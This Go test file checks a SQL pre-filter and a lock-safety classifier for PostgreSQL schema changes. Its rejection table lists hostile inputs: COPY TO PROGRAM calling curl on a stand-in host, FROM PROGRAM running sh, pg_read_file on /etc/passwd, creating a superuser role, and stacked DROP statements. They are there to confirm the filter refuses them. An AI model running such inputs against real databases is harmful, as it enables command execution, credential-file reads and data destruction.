package engine

import (
	"errors"
	"strings"
	"testing"
)

// TestAssessAllowlist is the pre-filter's table. Remember what this layer is
// and is not: it is UX, not security. A test failing here means a user gets a
// confusing message, not that a server is exposed — the boundary is the
// NOSUPERUSER role, exercised in the integration tests.
func TestAssessAllowlist(t *testing.T) {
	cases := []struct {
		name     string
		sql      string
		accepted bool
		code     string // expected RejectedError.Code when rejected
	}{
		// --- accepted ---
		{"plain create index", `CREATE INDEX idx ON orders (customer_id)`, true, ""},
		{"create index trailing semicolon", `CREATE INDEX idx ON orders (customer_id);`, true, ""},
		{"create unique index", `CREATE UNIQUE INDEX idx ON orders (customer_id)`, true, ""},
		{"create index concurrently", `CREATE INDEX CONCURRENTLY idx ON orders (customer_id)`, true, ""},
		{"lowercase", `create index idx on orders (customer_id)`, true, ""},
		{"leading comment", "-- add an index\nCREATE INDEX idx ON orders (customer_id)", true, ""},
		{"block comment", "/* ticket 42 */ CREATE INDEX idx ON orders (customer_id)", true, ""},
		{"drop index", `DROP INDEX idx`, true, ""},
		{"alter table type", `ALTER TABLE orders ALTER COLUMN amount_cents TYPE numeric`, true, ""},
		{"alter index", `ALTER INDEX idx RENAME TO idx2`, true, ""},
		{"reindex", `REINDEX INDEX idx`, true, ""},
		{"vacuum full", `VACUUM FULL orders`, true, ""},
		{"plain vacuum", `VACUUM orders`, true, ""},
		// Accepted by the pre-filter, then answered "already safe" — the
		// semicolon inside the literal must not read as a second statement.
		{"semicolon inside a literal", `COMMENT ON TABLE orders IS 'one; two'`, false, string(ClassComment)},
		{"add constraint", `ALTER TABLE orders ADD CONSTRAINT chk CHECK (amount_cents > 0)`, true, ""},

		// --- rejected ---
		{"empty", ``, false, "empty"},
		{"whitespace only", "   \n\t ", false, "empty"},
		{"comment only", "-- nothing to see", false, "empty"},
		{"sneaky multi statement", `CREATE INDEX idx ON orders (customer_id); DROP TABLE orders`, false, "multi_statement"},
		{"multi statement newline", "CREATE INDEX idx ON orders (id);\nDROP DATABASE postgres", false, "multi_statement"},
		{"multi statement no space after semi", `CREATE INDEX idx ON orders (id);DROP TABLE orders`, false, "multi_statement"},
		{"copy to program", `COPY orders TO PROGRAM 'curl evil.example.com'`, false, "not_allowlisted"},
		{"copy from program", `COPY orders FROM PROGRAM 'sh -c id'`, false, "not_allowlisted"},
		{"drop database", `DROP DATABASE postgres`, false, "not_allowlisted"},
		{"create role", `CREATE ROLE attacker SUPERUSER LOGIN`, false, "not_allowlisted"},
		{"grant", `GRANT ALL ON orders TO PUBLIC`, false, "not_allowlisted"},
		{"select", `SELECT pg_read_file('/etc/passwd')`, false, "not_allowlisted"},
		{"do block", `DO $$ BEGIN PERFORM 1; END $$`, false, "not_allowlisted"},
		{"drop table", `DROP TABLE orders`, false, "not_allowlisted"},
		{"create table", `CREATE TABLE evil (id int)`, false, "not_allowlisted"},
		{"comment then payload", "/* CREATE INDEX */ DROP TABLE orders", false, "not_allowlisted"},
		{"set role", `SET ROLE postgres`, false, "not_allowlisted"},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			_, err := Assess(c.sql)
			if c.accepted {
				if err != nil {
					t.Fatalf("Assess(%q) rejected: %v", c.sql, err)
				}
				return
			}
			if err == nil {
				t.Fatalf("Assess(%q) was accepted; it must be refused", c.sql)
			}
			var rej *RejectedError
			if !errors.As(err, &rej) {
				t.Fatalf("Assess(%q) returned %T, want *RejectedError", c.sql, err)
			}
			if rej.Reason == "" {
				t.Error("a rejection with no reason is useless to the user")
			}
			if c.code != "" && rej.Code != c.code {
				t.Errorf("Assess(%q) code = %q, want %q (reason: %s)", c.sql, rej.Code, c.code, rej.Reason)
			}
		})
	}
}

// TestOversizedInputIsRefused: 5KB of SQL, per the spec's cap.
func TestOversizedInputIsRefused(t *testing.T) {
	big := "CREATE INDEX idx ON orders (customer_id) -- " + strings.Repeat("x", 5*1024)
	_, err := Assess(big)
	var rej *RejectedError
	if !errors.As(err, &rej) {
		t.Fatalf("5KB input returned %v, want a *RejectedError", err)
	}
	if rej.Code != "too_long" {
		t.Errorf("code = %q, want too_long", rej.Code)
	}
	// And a statement just under the cap is still accepted.
	ok := "CREATE INDEX idx ON orders (customer_id) -- " + strings.Repeat("x", maxSQLBytes-60)
	if _, err := Assess(ok); err != nil {
		t.Errorf("a statement under the cap was refused: %v", err)
	}
}

// TestSemicolonsInsideLiteralsAreNotStatements: the multi-statement check must
// not fire on a semicolon inside a string, a quoted identifier, a comment or a
// dollar-quoted body. Getting this wrong produces a baffling rejection for
// perfectly ordinary SQL.
func TestSemicolonsInsideLiteralsAreNotStatements(t *testing.T) {
	cases := []string{
		`COMMENT ON TABLE orders IS 'semi; colon'`,
		`COMMENT ON TABLE orders IS 'it''s; fine'`,
		`CREATE INDEX "weird;name" ON orders (customer_id)`,
		"CREATE INDEX idx ON orders (customer_id) -- trailing; comment",
		"/* a; b */ CREATE INDEX idx ON orders (customer_id)",
		`COMMENT ON TABLE orders IS $tag$a; b$tag$`,
		`CREATE INDEX idx ON orders (customer_id);   `,
		"CREATE INDEX idx ON orders (customer_id);\n\n",
	}
	for _, sql := range cases {
		if got := splitStatements(sql); len(got) != 1 {
			t.Errorf("splitStatements(%q) = %d statements %q, want 1", sql, len(got), got)
		}
	}
}

func TestSplitStatementsCountsRealStatements(t *testing.T) {
	cases := []struct {
		sql  string
		want int
	}{
		{`CREATE INDEX a ON t (c)`, 1},
		{`CREATE INDEX a ON t (c); DROP TABLE t`, 2},
		{`CREATE INDEX a ON t (c);DROP TABLE t;`, 2},
		{`;;;`, 0},
		{``, 0},
		{`COMMENT ON TABLE t IS 'a;b'; DROP TABLE t`, 2},
	}
	for _, c := range cases {
		got := splitStatements(c.sql)
		n := len(got)
		if n == 1 && got[0] == "" {
			n = 0
		}
		if n != c.want {
			t.Errorf("splitStatements(%q) = %q (%d), want %d", c.sql, got, n, c.want)
		}
	}
}

// TestSafeDetector is the table for the "this one's actually safe" redirect.
// PredictedSafe is a claim about PostgreSQL 16 specifically; each row here is a
// claim we are prepared to defend.
func TestSafeDetector(t *testing.T) {
	cases := []struct {
		sql           string
		class         Classification
		predictedSafe bool
		triviallySafe bool
	}{
		{`CREATE INDEX idx ON orders (customer_id)`, ClassCreateIndex, false, false},
		{`CREATE INDEX CONCURRENTLY idx ON orders (customer_id)`, ClassCreateIndexConcurrently, true, false},
		{`create unique index concurrently idx on orders (customer_id)`, ClassCreateIndexConcurrently, true, false},
		{`DROP INDEX idx`, ClassDropIndex, false, false},
		{`DROP INDEX CONCURRENTLY idx`, ClassDropIndexConcurrently, true, false},
		{`REINDEX INDEX idx`, ClassReindex, false, false},
		{`REINDEX INDEX CONCURRENTLY idx`, ClassReindexConcurrently, true, false},
		{`ALTER TABLE orders ALTER COLUMN amount_cents TYPE numeric`, ClassAlterColumnType, false, false},
		{`ALTER TABLE orders ALTER COLUMN amount_cents SET DATA TYPE numeric`, ClassAlterColumnType, false, false},
		{`ALTER TABLE orders ADD COLUMN notes text`, ClassAddColumnConstDefault, true, true},
		{`ALTER TABLE orders ADD COLUMN status text DEFAULT 'new'`, ClassAddColumnConstDefault, true, true},
		{`ALTER TABLE orders ADD COLUMN n int DEFAULT 0 NOT NULL`, ClassAddColumnConstDefault, true, true},
		{`ALTER TABLE orders ADD COLUMN created timestamptz DEFAULT now()`, ClassAddColumnVolatile, false, false},
		{`ALTER TABLE orders ADD COLUMN created timestamptz DEFAULT CURRENT_TIMESTAMP`, ClassAddColumnVolatile, false, false},
		{`ALTER TABLE orders ADD COLUMN u uuid DEFAULT gen_random_uuid()`, ClassAddColumnVolatile, false, false},
		{`ALTER TABLE orders ADD COLUMN r double precision DEFAULT random()`, ClassAddColumnVolatile, false, false},
		{`ALTER TABLE orders ADD COLUMN sku text UNIQUE`, ClassAddConstraint, false, false},
		{`ALTER TABLE orders ADD COLUMN cid bigint REFERENCES customers (id)`, ClassAddConstraint, false, false},
		{`ALTER TABLE orders ADD CONSTRAINT fk FOREIGN KEY (customer_id) REFERENCES customers (id)`, ClassAddConstraint, false, false},
		{`ALTER TABLE orders ADD CONSTRAINT fk FOREIGN KEY (customer_id) REFERENCES customers (id) NOT VALID`, ClassAddConstraintNotValid, true, false},
		{`ALTER TABLE orders VALIDATE CONSTRAINT fk`, ClassValidateConstraint, true, false},
		{`ALTER TABLE orders ALTER COLUMN customer_id SET NOT NULL`, ClassSetNotNull, false, false},
		// A user-defined (or any unlisted) function default is NOT provably
		// constant, so it must NOT fall through to add_column_const_default /
		// already_safe — it is a rewrite candidate that gets rehearsed. This is the
		// CRITICAL false-SAFE, pinned at the classification level.
		{`ALTER TABLE orders ADD COLUMN x double precision NOT NULL DEFAULT my_volatile_fn()`, ClassAddColumnVolatile, false, false},
		{`ALTER TABLE orders ADD COLUMN x int DEFAULT floor(random()*10)`, ClassAddColumnVolatile, false, false},
		// Catalog-only ALTER TABLE forms: constant-time, so they must NOT be the
		// O(rows) generic class that the scale layer projects into a false-UNSAFE.
		{`ALTER TABLE orders DROP COLUMN status`, ClassAlterTableConstantTime, false, false},
		{`ALTER TABLE orders ALTER COLUMN status SET DEFAULT 'x'`, ClassAlterTableConstantTime, false, false},
		{`ALTER TABLE orders RENAME COLUMN status TO state`, ClassAlterTableConstantTime, false, false},
		// SET LOGGED rewrites the table, so it stays the scaling generic class.
		{`ALTER TABLE orders SET LOGGED`, ClassAlterTableOther, false, false},
		{`ALTER INDEX idx RENAME TO idx2`, ClassAlterIndex, true, false},
		{`ALTER INDEX idx SET TABLESPACE fast`, ClassAlterIndexRewrite, false, false},
		{`VACUUM FULL orders`, ClassVacuumFull, false, false},
		{`VACUUM (ANALYZE) orders`, ClassVacuum, true, false},
		{`ANALYZE orders`, ClassAnalyze, true, true},
		{`COMMENT ON TABLE orders IS 'the orders'`, ClassComment, true, true},
	}

	for _, c := range cases {
		t.Run(string(c.class)+"/"+c.sql[:min(len(c.sql), 46)], func(t *testing.T) {
			as, err := Assess(c.sql)
			if c.triviallySafe {
				var rej *RejectedError
				if !errors.As(err, &rej) {
					t.Fatalf("a catalog-only statement should be answered with already_safe, got err=%v", err)
				}
				if rej.Kind != RejectAlreadySafe {
					t.Fatalf("kind = %q, want already_safe", rej.Kind)
				}
				if rej.Classification != c.class {
					t.Errorf("classification = %q, want %q", rej.Classification, c.class)
				}
				if rej.Reason == "" {
					t.Error("already_safe with no reason teaches nothing")
				}
			} else if err != nil {
				t.Fatalf("Assess: %v", err)
			}
			if as == nil {
				t.Fatal("Assess returned no assessment")
			}
			if as.Classification != c.class {
				t.Errorf("classification = %q, want %q", as.Classification, c.class)
			}
			if as.PredictedSafe != c.predictedSafe {
				t.Errorf("PredictedSafe = %v, want %v", as.PredictedSafe, c.predictedSafe)
			}
			if as.Lesson.TriviallySafe != c.triviallySafe {
				t.Errorf("TriviallySafe = %v, want %v", as.Lesson.TriviallySafe, c.triviallySafe)
			}
		})
	}
}

func TestConcurrentFlag(t *testing.T) {
	for _, sql := range []string{
		`CREATE INDEX CONCURRENTLY idx ON orders (customer_id)`,
		`DROP INDEX CONCURRENTLY idx`,
		`REINDEX INDEX CONCURRENTLY idx`,
	} {
		as, err := Assess(sql)
		if err != nil {
			t.Fatalf("Assess(%q): %v", sql, err)
		}
		if !as.Concurrent {
			t.Errorf("Assess(%q).Concurrent = false", sql)
		}
	}
	as, err := Assess(`CREATE INDEX idx ON orders (customer_id)`)
	if err != nil {
		t.Fatal(err)
	}
	if as.Concurrent {
		t.Error("a plain CREATE INDEX must not be flagged concurrent")
	}
}

// TestTeachMapIsComplete: no verdict may ever ship without teach text. Every
// classification the engine can produce must carry an explanation, and it must
// be a real one — a stub sentence would pass a non-empty check and fail the
// user, so the length floor is deliberate.
func TestTeachMapIsComplete(t *testing.T) {
	for _, c := range Classifications() {
		l, ok := lessons[c]
		if !ok {
			t.Errorf("classification %q has no teach-map entry", c)
			continue
		}
		if l.Title == "" {
			t.Errorf("classification %q has no Title", c)
		}
		if len(l.Explanation) < 120 {
			t.Errorf("classification %q has a stub Explanation (%d chars): %q", c, len(l.Explanation), l.Explanation)
		}
		if l.BlocksWrites && l.TriviallySafe {
			t.Errorf("classification %q claims to block writes AND to be trivially safe", c)
		}
		// Every shape we call dangerous should offer a way out, or say why it
		// cannot. The generic fallback is the only permitted exception.
		if l.BlocksWrites && l.Suggestion == "" && c != ClassGeneric && c != ClassAlterTableOther &&
			c != ClassAlterTableConstantTime && c != ClassAlterIndexRewrite {
			t.Errorf("classification %q blocks writes but suggests no safe rewrite", c)
		}
	}
	// Explain must never return an empty Lesson, even for a bogus key.
	if got := Explain(Classification("nonsense")); got.Explanation == "" {
		t.Error("Explain fell through to an empty Lesson")
	}
}

func TestModeNormalize(t *testing.T) {
	for _, c := range []struct {
		in   Mode
		want Mode
		ok   bool
	}{
		{"", ModeCustom, true},
		{ModeNaive, ModeNaive, true},
		{ModeSafe, ModeSafe, true},
		{ModeCustom, ModeCustom, true},
		{"wat", "", false},
	} {
		got, err := c.in.normalize()
		if c.ok {
			if err != nil {
				t.Errorf("normalize(%q): %v", c.in, err)
			}
			if got != c.want {
				t.Errorf("normalize(%q) = %q, want %q", c.in, got, c.want)
			}
			continue
		}
		var rej *RejectedError
		if !errors.As(err, &rej) {
			t.Errorf("normalize(%q) returned %v, want *RejectedError", c.in, err)
		}
	}
}
